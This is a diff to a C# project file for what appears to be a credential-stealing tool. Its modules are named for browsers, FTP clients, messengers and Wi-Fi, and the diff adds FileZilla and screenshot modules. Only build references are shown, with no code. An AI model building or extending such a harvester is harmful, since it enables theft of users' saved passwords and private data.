@@ -34,8 +34,10 @@
   </PropertyGroup>
   <ItemGroup>
     <Reference Include="System" />
+    <Reference Include="System.Drawing" />
     <Reference Include="System.Security" />
     <Reference Include="System.Data" />
+    <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml" />
     <Reference Include="WindowsBase" />
   </ItemGroup>
@@ -43,6 +45,7 @@
     <Compile Include="Browsers\FireFox.cs" />
     <Compile Include="Browsers\IE.cs" />
     <Compile Include="Browsers\OldSogou.cs" />
+    <Compile Include="FTP\FileZilla.cs" />
     <Compile Include="FTP\WinSCP.cs" />
     <Compile Include="Helper\AesGcm.cs" />
     <Compile Include="Helper\Asn1Der.cs" />
@@ -74,6 +77,7 @@
     <Compile Include="Messengers\QQ.cs" />
     <Compile Include="Messengers\Skype.cs" />
     <Compile Include="Messengers\Telegram.cs" />
+    <Compile Include="Others\ScreenShot.cs" />
     <Compile Include="Others\Wifi.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
